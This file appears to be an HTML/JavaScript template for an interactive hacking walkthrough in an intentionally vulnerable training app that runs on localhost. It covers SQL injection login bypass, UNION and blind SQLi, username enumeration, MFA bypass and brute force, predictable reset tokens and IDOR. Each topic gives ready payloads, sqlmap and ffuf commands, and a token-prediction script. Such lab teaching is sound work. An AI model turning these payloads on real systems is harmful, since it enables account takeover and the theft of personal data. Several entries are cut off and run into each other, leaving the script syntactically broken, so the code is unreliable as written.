{% extends "base.html" %}
{% block title %}Walkthrough - Thyhe{% endblock %}
{% block content %}

<div class="d-flex justify-content-between align-items-center mb-4">
    <h2><i class="bi bi-mortarboard"></i> Interactive Walkthrough</h2>
    <div class="d-flex align-items-center gap-3">
        <span class="text-muted">Progress:</span>
        <span id="overall-progress" class="text-success fw-bold">0/0</span>
        <div class="wt-progress" style="width: 150px;">
            <div id="overall-progress-bar" class="wt-progress-bar" style="width: 0%"></div>
        </div>
        <button class="btn btn-sm btn-outline-danger" onclick="resetProgress()" title="Reset all progress"><i class="bi bi-arrow-counterclockwise"></i></button>
    </div>
</div>

<nav id="breadcrumb" aria-label="breadcrumb" class="mb-4">
    <ol class="breadcrumb" id="breadcrumb-list">
        <li class="breadcrumb-item active">Categories</li>
    </ol>
</nav>

<!-- View 1: Category Grid -->
<div id="view-categories">
    <p class="text-muted mb-4">Pick a category below and let's start hunting. I will walk you through each vulnerability step by step.</p>
    <div class="row g-3" id="category-grid"></div>
</div>

<!-- View 2: Vulnerability List -->
<div id="view-vulns" style="display:none;">
    <p class="text-muted mb-3" id="vuln-list-intro"></p>
    <div id="vuln-list"></div>
    <button class="btn btn-outline-secondary mt-3" onclick="showCategories()"><i class="bi bi-arrow-left"></i> Back to Categories</button>
</div>

<!-- View 3: Step Wizard -->
<div id="view-wizard" style="display:none;">
    <div id="step-indicator" class="wt-step-indicator"></div>
    <div id="step-content" class="wt-step-content"></div>
    <div class="d-flex justify-content-between mt-4">
        <button id="btn-prev" class="btn btn-outline-secondary" onclick="prevStep()"><i class="bi bi-arrow-left"></i> Previous</button>
        <button id="btn-complete" class="btn btn-success" onclick="markComplete()" style="display:none;"><i class="bi bi-check-circle"></i> Mark Complete</button>
        <button id="btn-next" class="btn btn-primary" onclick="nextStep()">Next <i class="bi bi-arrow-right"></i></button>
    </div>
</div>

{% raw %}
<script>
const STEP_ICONS = [
    {title: "Where to Look", icon: "bi-geo-alt"},
    {title: "What to Notice", icon: "bi-eye"},
    {title: "What to Try", icon: "bi-lightning"},
    {title: "Expected Result", icon: "bi-check-circle"},
    {title: "Why It Works", icon: "bi-book"},
    {title: "Try It Yourself", icon: "bi-play-circle"},
    {title: "Automate It", icon: "bi-robot"}
];

const WALKTHROUGH_DATA = {
categories: [
{
    id: "auth",
    name: "Authentication Bypass",
    icon: "bi-key",
    badgeClass: "vuln-auth",
    description: "Let's break into accounts without knowing the password.",
    vulns: [
        {
            id: "auth-sqli-login",
            name: "SQL Injection Login Bypass",
            difficulty: "Easy",
            steps: [
                `<p class="wt-mentor-text">Alright, first things first. Every web app has a login page, and that is always worth poking at. Let's go take a look.</p>
                <p>Head over to the <a href="/login" target="_blank">Login page</a>. You will see a standard username and password form. Nothing fancy on the surface.</p>`,

                `<p class="wt-mentor-text">Before we try anything wild, let's see how the app reacts to unexpected input.</p>
                <p>Type a single quote <code>'</code> into the username field and hit submit. If the app shows a database error or behaves differently than a normal "wrong password" message, that is a strong hint that your input is going directly into a SQL query.</p>
                <p>Also try submitting a valid username like <code>admin</code> with a wrong password, then try a completely fake username. Do you get different error messages? That tells you something too.</p>`,

                `<p class="wt-mentor-text">The login form looks like it builds the SQL query with your input directly. Let's use that.</p>
                <p>Try this in the username field:</p>
                <pre>admin'-- </pre>
                <p>Password can be anything, like <code>x</code>.</p>
                <p>Or try the classic:</p>
                <pre>' OR '1'='1' -- </pre>
                <p>Note the space after the double dash. That is important in SQL.</p>`,

                `<p class="wt-mentor-text">If it worked, you should be logged in without ever knowing the real password.</p>
                <p>With <code>admin'--</code> you get in as admin and land on the MFA page (admin has MFA enabled). With a non-MFA user, try <code>agarcia'--</code> and you will go straight to the dashboard.</p>
                <p>If you used <code>' OR '1'='1' --</code>, you might log in as the first user in the database.</p>`,

                `<p class="wt-mentor-text">Here is what is happening behind the scenes.</p>
                <p>The app builds the query like this:</p>
                <pre>SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'</pre>
                <p>When you type <code>admin'--</code>, it becomes:</p>
                <pre>SELECT * FROM users WHERE username = 'admin'--' AND password = 'x'</pre>
                <p>The <code>--</code> is a SQL comment. Everything after it gets ignored, including the password check. The database just looks for a user called "admin" and returns it.</p>`,

                `<div class="wt-try-box">
                    <a href="/login" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-box-arrow-in-right"></i> Go to Login Page</a>
                </div>
                <p class="mt-3"><strong>Extra challenges:</strong></p>
                <ul>
                    <li>Can you log in as <code>jsmith</code> or <code>bwilson</code>?</li>
                    <li>What happens if you use <code>' OR 1=1 --</code> ? Who do you log in as?</li>
                    <li>Can you use the UNION technique here to extract data?</li>
                </ul>`,

                `<p class="wt-mentor-text">Let's hand this off to sqlmap and let it do the heavy lifting.</p>
                <p><strong>Step 1:</strong> Test the injection:</p>
                <pre>sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" -p username --batch</pre>
                <p><strong>Step 2:</strong> Dump all users once confirmed:</p>
                <pre>sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" -p username --batch -T users --dump</pre>
                <p><strong>Flags explained:</strong></p>
                <ul>
                    <li><code>--data</code> = POST body</li>
                    <li><code>-p username</code> = only test the username parameter</li>
                    <li><code>--batch</code> = auto-answer all prompts</li>
                    <li><code>-T users --dump</code> = dump the users table</li>
                </ul>
                <p class="text-warning"><strong>Note:</strong> If the account has MFA, sqlmap might get confused by the redirect to /mfa. Use <code>-p password</code> instead, or target a non-MFA user.</p>`
            ]
        },
        {
            id: "auth-username-enum",
            name: "Username Enumeration",
            difficulty: "Easy",
            steps: [
                `<p class="wt-mentor-text">Before trying to break in, it helps to know who actually has an account. Let's see if the app leaks that information.</p>
                <p>There are three places to check: <a href="/login" target="_blank">/login</a>, <a href="/register" target="_blank">/register</a>, and <a href="/reset-password" target="_blank">/reset-password</a>.</p>`,

                `<p class="wt-mentor-text">Pay close attention to the error messages. Do they say different things depending on whether the username exists?</p>
                <p>On the login page, try logging in with <code>admin</code> (real user) and a wrong password. Then try <code>fakeuser12345</code>. Compare the error messages carefully. Even a small wording difference is enough.</p>`,

                `<p class="wt-mentor-text">Let's confirm this across all three endpoints.</p>
                <p><strong>Login:</strong> Try <code>admin</code> + wrong password, then <code>nonexistentuser</code> + wrong password. Compare responses.</p>
                <p><strong>Register:</strong> Try registering with username <code>admin</code>. Does it say the name is taken?</p>
                <p><strong>Reset Password:</strong> Try resetting for <code>admin</code> vs <code>fakeuser12345</code>. Different messages?</p>`,

                `<p class="wt-mentor-text">You should see distinct responses.</p>
                <p>Login gives "Invalid password" for real users but "User not found" for fake ones. Register says "Username already taken" for existing users. Reset says "No account found" for nonexistent emails.</p>
                <p>Each of these confirms whether an account exists. An attacker could use Burp Intruder with a wordlist to enumerate valid usernames quickly.</p>`,

                `<p class="wt-mentor-text">This is called username enumeration, and it is a surprisingly common finding.</p>
                <p>The fix is simple: always return the same message regardless. Something like "If an account exists, we have sent a reset link" gives nothing away. But many apps still get this wrong because developers want to be "helpful" to users.</p>
                <p>In a real bug bounty, this alone might be low severity, but combined with a brute force attack, it becomes much more dangerous.</p>`,

                `<div class="wt-try-box">
                    <a href="/login" target="_blank" class="btn btn-outline-info me-2"><i class="bi bi-box-arrow-in-right"></i> Login</a>
                    <a href="/register" target="_blank" class="btn btn-outline-info me-2"><i class="bi bi-person-plus"></i> Register</a>
                    <a href="/reset-password" target="_blank" class="btn btn-outline-info"><i class="bi bi-key"></i> Reset</a>
                </div>
                <p class="mt-3"><strong>Extra challenge:</strong> Can you automate this with Burp Intruder or ffuf? Try a wordlist of common names and filter by response length.</p>`,

                `<p class="wt-mentor-text">Let's automate the username enumeration with ffuf.</p>
                <p><strong>On the login page</strong> (match the error message that only appears for valid users):</p>
                <pre>ffuf -u http://localhost:5000/login -X POST \\
  -d "username=FUZZ&password=wrong" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -w /usr/share/seclists/Usernames/Names/names.txt \\
  -mr "Invalid password"</pre>
                <p>Invalid usernames return "User not found" while valid ones return "Invalid password". The <code>-mr</code> flag matches only responses containing that string, so only valid usernames show up.</p>
                <p><strong>On the register page:</strong></p>
                <pre>ffuf -u http://localhost:5000/register -X POST \\
  -d "username=FUZZ&password=test&email=t@t.com" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -w /usr/share/seclists/Usernames/Names/names.txt \\
  -mr "already taken"</pre>
                <p><code>-mr "already taken"</code> only shows responses containing that string, which means the username exists.</p>`
            ]
        },
        {
            id: "auth-mfa-bypass",
            name: "MFA Bypass via Username Swap",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Some accounts have multi-factor authentication. Sounds secure, right? Let's see how well it is actually implemented.</p>
                <p>First, you need to reach the MFA page. Log in with <code>admin'--</code> (SQLi bypass) or use valid credentials for an MFA-enabled account. You will be redirected to <a href="/mfa" target="_blank">/mfa</a>.</p>
                <p><strong>MFA codes:</strong> admin = <code>123456</code>, jsmith = <code>654321</code></p>`,

                `<p class="wt-mentor-text">Look at the page source or intercept the request in Burp. See anything interesting in the form?</p>
                <p>There is a hidden field with the username. The MFA code is being validated against a code stored in the database, but the username comes from the form, not from the server session. That is a critical design flaw.</p>
                <p>Also notice that it says "Authenticating as: [username]" on the page. That username is your input.</p>`,

                `<p class="wt-mentor-text">Here is the trick. You can change that hidden username field to any user.</p>
                <p>Log in as admin (triggers MFA). On the MFA page, open your browser dev tools (F12), find the hidden input named <code>username</code>, and change it to <code>jsmith</code>. Now enter jsmith's MFA code: <code>654321</code>.</p>
                <p>Or intercept the POST request in Burp Suite and change the username parameter before it gets sent.</p>`,

                `<p class="wt-mentor-text">If it worked, you just authenticated as a completely different user.</p>
                <p>You should now be logged in as jsmith, even though you started the login flow as admin. The app trusted the username from the form instead of tracking it server-side.</p>`,

                `<p class="wt-mentor-text">This is a classic session binding issue.</p>
                <p>The MFA implementation validates the code correctly, but it does not bind the code check to the user's session. The username comes from a client-controlled hidden field, so an attacker can swap it. The fix is to store the username in the server session during the login step and never accept it from the client during MFA verification.</p>`,

                `<div class="wt-try-box">
                    <a href="/login" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-shield-lock"></i> Start at Login</a>
                </div>
                <p class="mt-3"><strong>MFA codes to know:</strong> admin = <code>123456</code>, jsmith = <code>654321</code></p>
                <p><strong>Extra challenge:</strong> Can you bypass MFA entirely by modifying the POST request to skip the MFA step?</p>`
            ]
        },
        {
            id: "auth-mfa-brute",
            name: "MFA Brute Force",
            difficulty: "Hard",
            steps: [
                `<p class="wt-mentor-text">What if you do not know the MFA code at all? If it is short enough and there is no rate limiting, you might be able to just guess it.</p>
                <p>Head to the <a href="/mfa" target="_blank">MFA page</a> (log in first to trigger it).</p>
                <p><strong>MFA codes:</strong> admin = <code>123456</code>, jsmith = <code>654321</code></p>`,

                `<p class="wt-mentor-text">Think about the code format. It is 6 digits, so that is 000000 to 999999. That is a million possibilities, which sounds like a lot, but machines are fast.</p>
                <p>Try submitting a wrong code a few times. Is there any lockout? Any rate limiting? Any CAPTCHA? If not, you can automate this.</p>`,

                `<p class="wt-mentor-text">Let's set up a brute force with Burp Intruder or ffuf.</p>
                <p>In Burp, intercept the MFA POST, send it to Intruder, set the code field as the payload position, and use a numeric range from 000000 to 999999. Or with ffuf:</p>
                <pre>ffuf -u http://localhost:5000/mfa -X POST -d "username=admin&mfa_code=FUZZ" -w numbers.txt -fc 200 -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: session=YOUR_SESSION"</pre>
                <p>You can generate the numbers file with: <code>seq -w 000000 999999 > numbers.txt</code></p>`,

                `<p class="wt-mentor-text">When you hit the right code, the response will be a redirect to the dashboard instead of the MFA page with an error.</p>
                <p>In Burp Intruder, filter by response status code (302 vs 200) or response length. The correct code will stand out.</p>`,

                `<p class="wt-mentor-text">This works because there is zero rate limiting on the MFA endpoint.</p>
                <p>A 6-digit code has 1,000,000 combinations. With no lockout, an attacker sending 100 requests per second could crack it in under 3 hours. With a 4-digit code, it takes seconds. The fix is to implement rate limiting, account lockout after N failed attempts, and increasing delays between attempts.</p>`,

                `<div class="wt-try-box">
                    <a href="/login" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-shield-lock"></i> Go to Login</a>
                </div>
                <p class="mt-3"><strong>Tip:</strong> For this lab, admin's code is <code>123456</code> and jsmith's is <code>654321</code>. In a real scenario, you would need to brute force it. The point here is to recognize that no rate limiting + numeric codes = bruteforceable.</p>`,

                `<p class="wt-mentor-text">Let's set up ffuf to brute force the MFA code.</p>
                <p><strong>Step 1:</strong> Generate a number wordlist:</p>
                <pre>seq -w 000000 999999 > /tmp/mfa-codes.txt</pre>
                <p><strong>Step 2:</strong> Log in to trigger MFA, grab your session cookie, then run:</p>
                <pre>ffuf -u http://localhost:5000/mfa -X POST \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -H "Cookie: session=YOUR_SESSION" \\
  -d "username=admin&mfa_code=FUZZ" \\
  -w /tmp/mfa-codes.txt \\
  -fc 200</pre>
                <p><strong>Why <code>-fc 200</code>?</strong> Wrong codes return 200 (the MFA page reloads with an error). The correct code returns 302 (redirect to dashboard). Filtering out 200 leaves only the hit.</p>
                <p><strong>Faster approach:</strong> If you want to narrow it down, use a smaller range first: <code>seq -w 123400 123500 > /tmp/test.txt</code> to test that ffuf is working before running the full million.</p>`
            ]
        },
        {
            id: "auth-predictable-reset",
            name: "Predictable Password Reset Token",
            difficulty: "Hard",
            steps: [
                `<p class="wt-mentor-text">Password reset flows are a goldmine for attackers. Let's see how this one generates its reset tokens.</p>
                <p>Go to <a href="/reset-password" target="_blank">/reset-password</a> and request a reset for a known user.</p>`,

                `<p class="wt-mentor-text">After submitting, you get a reset link. Look at the token in that URL carefully. Does it look random? Or does it follow a pattern?</p>
                <p>Try requesting a reset multiple times and compare the tokens. If they are sequential or based on predictable values (like timestamps or user IDs), that is a vulnerability.</p>
                <p>The token is an MD5 hash. MD5 of what though?</p>`,

                `<p class="wt-mentor-text">The token is generated from the user's ID and the current Unix timestamp. If you know (or guess) both, you can predict the token.</p>
                <p>Request a reset and note the exact time. Then generate candidate tokens:</p>
                <pre>import hashlib, time
user_id = 1  # admin
ts = int(time.time())
for t in range(ts-5, ts+5):
    token = hashlib.md5(f"{user_id}{t}".encode()).hexdigest()
    print(f"Try: /reset-password/{token}")</pre>`,

                `<p class="wt-mentor-text">One of those generated tokens should match the real reset link.</p>
                <p>Visit the matching URL and you will be able to set a new password for that account. You just took over the admin account without any access to their email.</p>`,

                `<p class="wt-mentor-text">Predictable tokens are a critical vulnerability.</p>
                <p>The reset token is <code>MD5(user_id + unix_timestamp)</code>. Both values are guessable: user IDs are sequential integers, and the timestamp is known within a few seconds of when the request was made. A secure implementation uses a cryptographically random token (like <code>secrets.token_urlsafe(32)</code>) that cannot be predicted.</p>`,

                `<div class="wt-try-box">
                    <a href="/reset-password" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-key"></i> Go to Reset Password</a>
                </div>
                <p class="mt-3"><strong>Extra challenge:</strong> Write a Python script that requests a reset and then automatically predicts the token within a 10-second window.</p>`
            ]
        }
    ]
},
{
    id: "idor",
    name: "IDOR / Broken Access Control",
    icon: "bi-hash",
    badgeClass: "vuln-idor",
    description: "Access things you should not be able to see by changing IDs and parameters.",
    vulns: [
        {
            id: "idor-employees",
            name: "Employee Records (IDOR)",
            difficulty: "Easy",
            steps: [
                `<p class="wt-mentor-text">Let's see if we can access other people's data by just changing a number in the URL.</p>
                <p>Log in and go to the <a href="/employees" target="_blank">Employees directory</a>. Click on any employee to see their profile.</p>`,

                `<p class="wt-mentor-text">Look at the URL when you view an employee. It is something like <code>/employees/1001</code>. That number is the employee ID. Is there any check on whether you are allowed to view this record?</p>
                <p>Notice what information is on this page: SSN, salary, home address. Sensitive stuff.</p>`,

                `<p class="wt-mentor-text">Try changing the ID in the URL. Go to <code>/employees/1001</code>, then <code>/employees/1002</code>, <code>/employees/1003</code>, and so on up to 1010.</p>
                <p>You can also try IDs below 1001 or above 1010 to see what happens with invalid IDs.</p>`,

                `<p class="wt-mentor-text">Every single employee record loads. No permission check at all.</p>
                <p>You should see full personal details for all 10 employees, including social security numbers, salaries, and addresses. As a regular user, you should only be able to see your own record (if any).</p>`,

                `<p class="wt-mentor-text">This is an Insecure Direct Object Reference (IDOR).</p>
                <p>The app uses the employee ID directly from the URL to fetch the record from the database, but never checks if the logged-in user is authorized to view it. The fix is to verify that the current user has permission to access the requested resource before returning it.</p>`,

                `<div class="wt-try-box">
                    <a href="/employees/1001" target="_blank" class="btn btn-outline-info me-2">Employee 1001</a>
                    <a href="/employees/1005" target="_blank" class="btn btn-outline-info me-2">Employee 1005</a>
                    <a href="/employees/1010" target="_blank" class="btn btn-outline-info">Employee 1010</a>
                </div>
                <p class="mt-3"><strong>Extra challenge:</strong> Can you automate this with Burp Intruder to dump all employee records at once? Set the ID as the payload position and use a numeric range.</p>`,

                `<p class="wt-mentor-text">Let's use ffuf to dump every employee record automatically.</p>
                <p><strong>Step 1:</strong> Generate an ID range:</p>
                <pre>seq 1001 1020 > /tmp/emp-ids.txt</pre>
                <p><strong>Step 2:</strong> Fuzz the employee endpoint:</p>
                <pre>ffuf -u http://localhost:5000/employees/FUZZ \\
  -w /tmp/emp-ids.txt \\
  -H "Cookie: session=YOUR_SESSION" \\
  -mc 200</pre>
                <p>Every 200 response is a valid employee record. Filter out 404s (invalid IDs) automatically with <code>-mc 200</code>.</p>
                <p><strong>To extract the actual data</strong>, use curl in a loop:</p>
                <pre>for id in $(seq 1001 1010); do
  echo "=== Employee $id ==="
  curl -s -b "session=YOUR_SESSION" \\
    "http://localhost:5000/employees/$id" | \\
    grep -oP 'SSN|Salary|Address.*'
done</pre>`
            ]
        },
        {
            id: "idor-tickets",
            name: "Support Tickets (IDOR)",
            difficulty: "Easy",
            steps: [
                `<p class="wt-mentor-text">You found IDOR on employee records. Good. Now the question a real pentester asks is: where else does this app use numeric IDs? Every feature that shows you "your" data by ID is worth testing.</p>
                <p>Go to <a href="/support" target="_blank">Support</a>. Create a ticket if you do not have one yet, then click to open it.</p>`,

                `<p class="wt-mentor-text">Check the URL: <code>/support/ticket/5</code> (or whatever ID your ticket got). That is a sequential integer, just like the employee IDs. Your ticket might be number 5, but tickets 1 through 4 were created by other users.</p>
                <p>Think about what information lives in support tickets. People report problems, ask for password resets, share error logs, sometimes paste credentials. This is high-value data if you can read other people's tickets.</p>`,

                `<p class="wt-mentor-text">Walk through the IDs manually: <code>/support/ticket/1</code>, <code>/support/ticket/2</code>, <code>/support/ticket/3</code>.</p>
                <p>But do not stop at reading. IDOR can affect any action on the resource. Try posting a reply to someone else's ticket:</p>
                <pre>/support/ticket/1/reply</pre>
                <p>If you can reply to a ticket you do not own, that is a second IDOR on the same feature. Always test view, edit, delete, and any sub-actions (replies, comments, attachments) separately.</p>`,

                `<p class="wt-mentor-text">Every ticket loads, and you can reply to them too. Two IDOR findings on one feature.</p>
                <p>In a real engagement, support tickets are goldmines. They frequently contain internal URLs, temporary passwords, infrastructure details, and security incident reports that were never meant for your eyes.</p>`,

                `<p class="wt-mentor-text">The methodology here is: once you find one IDOR, test every CRUD operation on that resource.</p>
                <p>CRUD stands for Create, Read, Update, Delete. The app might protect one but not the others. For example, maybe only admins can delete tickets, but anyone can read them. Or maybe reading is restricted but replying is not. In your report, each broken action is a separate finding - "unauthorized ticket read" and "unauthorized ticket reply" are two distinct issues.</p>`,

                `<div class="wt-try-box">
                    <a href="/support/ticket/1" target="_blank" class="btn btn-outline-info me-2">Ticket #1</a>
                    <a href="/support/ticket/2" target="_blank" class="btn btn-outline-info me-2">Ticket #2</a>
                    <a href="/support/ticket/3" target="_blank" class="btn btn-outline-info">Ticket #3</a>
                </div>`,

                `<p class="wt-mentor-text">Automate it with ffuf to find all valid ticket IDs.</p>
                <pre>ffuf -u http://localhost:5000/support/ticket/FUZZ \\
  -w <(seq 1 100) \\
  -H "Cookie: session=YOUR_SESSION" \\
  -mc 200</pre>
                <p><code>&lt;(seq 1 100)</code> generates IDs 1-100 on the fly without creating a file. Every 200 response is a readable ticket. Widen the range if you suspect more exist.</p>`
            ]
        },
        {
            id: "idor-messages",
            name: "Private Messages (IDOR)",
            difficulty: "Easy",
            steps: [
                `<p class="wt-mentor-text">Now let's think about impact. Not all IDORs are equal. Accessing someone's public profile via IDOR is low severity. But what about private messages?</p>
                <p>Go to <a href="/messages" target="_blank">Messages</a>. You will see your inbox. Click on a message to see its detail page URL.</p>`,

                `<p class="wt-mentor-text">The URL is <code>/messages/1</code> or similar. Same sequential integer pattern. But think about what private messages contain in a corporate app: people share passwords with colleagues ("here's the staging server creds"), discuss security issues, forward API keys, share links to internal tools.</p>
                <p>This is where IDOR goes from "I can see someone's name" to "I can read the admin's inbox."</p>`,

                `<p class="wt-mentor-text">Start changing the message ID: <code>/messages/1</code> through <code>/messages/8</code>.</p>
                <p>Read through each message carefully. Look for anything sensitive: passwords, access keys, internal hostnames, employee IDs. In a real pentest, this is where you build your next attack - credentials found in messages become your stepping stone to deeper access.</p>`,

                `<p class="wt-mentor-text">You can read every message in the system, including conversations between other users. Notice the messages with shared credentials and internal references. In a real environment, this single IDOR could hand you the keys to multiple other systems.</p>
                <p>This is why IDOR on private communications is consistently rated high or critical severity in bug bounties, even though the technical exploit is trivially simple.</p>`,

                `<p class="wt-mentor-text">The lesson here is about impact assessment, not just finding the bug.</p>
                <p>When you write up an IDOR finding, the severity depends on what data is exposed. Employee directory IDOR? Medium at best. Private message IDOR? High or critical, because the attacker gets access to confidential communications. Always demonstrate the worst-case impact in your report - show the message with the shared credentials, not just "I can access message ID 1."</p>`,

                `<div class="wt-try-box">

                <p>For all IDOR endpoints, the approach is identical: fuzz the numeric ID with a sequential range and filter for 200 responses. This works on <code>/messages/</code>, <code>/support/ticket/</code>, <code>/employees/</code>, and <code>/profile/</code>.</p>`

                `<p class="wt-mentor-text">There are two types of privilege escalation: vertical (regular user becomes admin) and horizontal (regular user accesses another regular user's data). Profiles are a classic horizontal target.</p>

        {
            id: "sqli-union-products",
            name: "UNION-Based SQLi (Product Search)",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Login bypass was fun, but UNION injection lets you actually extract data from the database. Let's go shopping.</p>
                <p>Head to <a href="/products" target="_blank">Products</a> and use the search bar.</p>`,

                `<p class="wt-mentor-text">Search for something and look at the results. Your search term appears in the page, and the results come from a database query. Try a single quote to see if it breaks.</p>
                <p>Search for <code>'</code> and see what happens. An error or empty results with odd behavior means SQL injection.</p>`,

                `<p class="wt-mentor-text">First, find the column count. The UNION requires the same number of columns as the original query.</p>
                <p>Try these searches one at a time:</p>
                <pre>' UNION SELECT null-- </pre>
                <pre>' UNION SELECT null,null-- </pre>
                <pre>' UNION SELECT null,null,null-- </pre>
                <pre>' UNION SELECT null,null,null,null-- </pre>
                <pre>' UNION SELECT null,null,null,null,null-- </pre>
                <p>When you stop getting errors, you found the column count. Then extract data:</p>
                <pre>' UNION SELECT id,username,password,email,role FROM users-- </pre>`,

                `<p class="wt-mentor-text">The product results table now shows user data. You should see usernames, password hashes or plaintext passwords, emails, and roles for every user in the database.</p>
                <p>The data appears in the product name, price, and description columns since they map to the UNION columns.</p>`,

                `<p class="wt-mentor-text">Here is the backend query:</p>
                <pre>SELECT * FROM products WHERE name LIKE '%INPUT%'</pre>
                <p>By injecting <code>' UNION SELECT ...</code>, you close the LIKE clause and append a second query. The database runs both and combines the results. The UNION must have the same number of columns (5 in this case), which is why we had to figure that out first.</p>`,

                `<div class="wt-try-box">
                    <a href="/products" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-search"></i> Go to Product Search</a>
                </div>
                <p class="mt-3"><strong>Extra challenges:</strong></p>
                <ul>
                    <li>Can you extract the SQLite version? Try <code>' UNION SELECT sqlite_version(),null,null,null,null--</code></li>
                    <li>Can you list all tables? Try <code>' UNION SELECT name,sql,null,null,null FROM sqlite_master--</code></li>
                    <li>Can you dump the employees table with SSNs and salaries?</li>
                </ul>`,

                `<p class="wt-mentor-text">sqlmap makes this trivial. This is the best endpoint for sqlmap because the search page renders full table output.</p>
                <p><strong>Enumerate tables:</strong></p>
                <pre>sqlmap -u "http://localhost:5000/products/search?q=test" \\
  --cookie="session=YOUR_SESSION" \\
  --batch --tables</pre>
                <p><strong>Dump the users table:</strong></p>
                <pre>sqlmap -u "http://localhost:5000/products/search?q=test" \\
  --cookie="session=YOUR_SESSION" \\
  --batch -T users --dump</pre>
                <p><strong>Dump employees (SSNs, salaries):</strong></p>
                <pre>sqlmap -u "http://localhost:5000/products/search?q=test" \\
  --cookie="session=YOUR_SESSION" \\
  --batch -T employees --dump</pre>
                <p>This is the fastest SQLi endpoint because sqlmap can use UNION technique here (full output visible on page). Compare this to <code>/products/filter</code> which needs blind techniques.</p>`
            ]
        },
        {
            id: "sqli-union-employees",
            name: "UNION-Based SQLi (Employee Search)",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">You cracked the product search. Now build the habit: every time you find SQLi on one search feature, check every other search feature in the app. Different tables often have different column counts, which teaches you about the database structure.</p>
                <p>Go to <a href="/employees" target="_blank">Employees</a> and find the search bar.</p>`,

                `<p class="wt-mentor-text">Start the same way you always should: drop a single quote <code>'</code> into the search and submit. Does the page error, return empty results, or behave oddly? That tells you whether the input reaches a SQL query.</p>
                <p>Once you confirm injection, you need the column count again. But here is the thing: the employee table is wider than the products table. Products had 5 columns. Employees will have more because of fields like SSN, salary, address, department.</p>`,

                `<p class="wt-mentor-text">Start counting columns. This is where patience pays off:</p>
                <pre>' UNION SELECT null,null,null,null,null-- </pre>
                <p>Error. Not enough columns. Keep adding nulls:</p>
                <pre>' UNION SELECT null,null,null,null,null,null,null-- </pre>
                <p>Still error. More:</p>
                <pre>' UNION SELECT null,null,null,null,null,null,null,null,null-- </pre>
                <p>It works at 9 columns. Now you know the employees table has 9 columns. Replace the nulls with data you want to extract. The trick is figuring out which UNION column maps to which display column on the page. Try putting distinct values in each position:</p>
                <pre>' UNION SELECT 'A','B','C','D','E','F','G','H','I' FROM users-- </pre>
                <p>Look at where A, B, C appear on the page. That tells you which positions are visible, so you know where to put <code>username</code>, <code>password</code>, etc.:</p>
                <pre>' UNION SELECT id,username,password,email,role,null,null,null,null FROM users-- </pre>`,

                `<p class="wt-mentor-text">The employee results table now shows user credentials instead of employee data. Each UNION column fills a different display column. Once you know the mapping, you can extract any table's data through this endpoint.</p>`,

                `<p class="wt-mentor-text">The column-counting skill is something you will use on every UNION injection. Different tables = different column counts. When you move from one search feature to another, you often need to recount. This teaches you the database schema as you go - the number and order of columns reveals the table structure even without seeing the query.</p>`,

                `<div class="wt-try-box">
                    <a href="/employees/search?q=test" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-search"></i> Go to Employee Search</a>
                </div>`,

                `<p class="wt-mentor-text">sqlmap works the same way on every search endpoint. Just change the URL.</p>
                <pre>sqlmap -u "http://localhost:5000/employees/search?q=test" \\

                <p><strong>Why <code>--level=3</code>?</strong> This search uses a LIKE query (<code>WHERE name LIKE '%input%'</code>). At the default level, sqlmap's payloads do not account for the surrounding <code>%</code> wildcards and fail to detect the injection. Level 3 includes LIKE-specific tests that handle this context.</p>`

                `<p class="wt-mentor-text">Let's build a systematic approach. You have found SQLi on products and employees. How do you find all the remaining injection points without guessing? Map the application first.</p>
                <p>Click through the nav bar and note every feature that has a search box, filter dropdown, or sort option. The support section at <a href="/support" target="_blank">Support</a> has a search - let's test it.</p>`,

                `<p class="wt-mentor-text">Before you even touch the search, think about what you know. The app uses SQLite (you confirmed that from previous injections). Every search so far has used a LIKE query. This one probably does too.</p>

        {
            id: "sqli-blind-filter",
            name: "Blind Boolean SQLi (Product Filter)",
            difficulty: "Hard",
            steps: [
                `<p class="wt-mentor-text">Not all SQL injection gives you visible output. Sometimes you have to ask the database yes/no questions. This is called blind SQLi.</p>
                <p>Go to <a href="/products" target="_blank">Products</a> and look for a filter or category parameter.</p>`,

                `<p class="wt-mentor-text">Try <code>/products/filter?category=Electronics</code>. You get products. Now try <code>/products/filter?category=Electronics' AND '1'='1</code>. Still get products? Try <code>Electronics' AND '1'='2</code>. No products?</p>
                <p>If the results change based on your condition, that is boolean-based blind SQLi.</p>`,

                `<p class="wt-mentor-text">You can extract data one character at a time by asking true/false questions:</p>
                <pre>/products/filter?category=Electronics' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a'-- </pre>
                <p>If products appear, the first character of admin's password is 'a'. If not, try 'b', 'c', etc.</p>
                <p>This is slow manually but tools like sqlmap automate it:</p>
                <pre>sqlmap -u "http://localhost:5000/products/filter?category=test" --technique=B --dump</pre>`,

                `<p class="wt-mentor-text">By testing each character position, you can extract the entire database contents. It takes many requests, but it works even when you cannot see the SQL output directly.</p>`,

                `<p class="wt-mentor-text">Blind SQLi works because the application behavior changes based on whether the injected condition is true or false.</p>
                <p>Products appear = true condition. No products = false condition. This binary signal lets you ask any yes/no question to the database. It is slower than UNION injection but equally powerful.</p>`,

                `<div class="wt-try-box">
                    <a href="/products/filter?category=Electronics" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-funnel"></i> Go to Product Filter</a>
                </div>`,

                `<p class="wt-mentor-text">This is where sqlmap saves you hours of manual work.</p>
                <p><strong>Important:</strong> This endpoint truncates long output, so UNION technique fails. You must force blind:</p>
                <pre>sqlmap -u "http://localhost:5000/products/filter?category=Networking" \\
  --cookie="session=YOUR_SESSION" \\
  --batch --technique=B -T users --dump</pre>
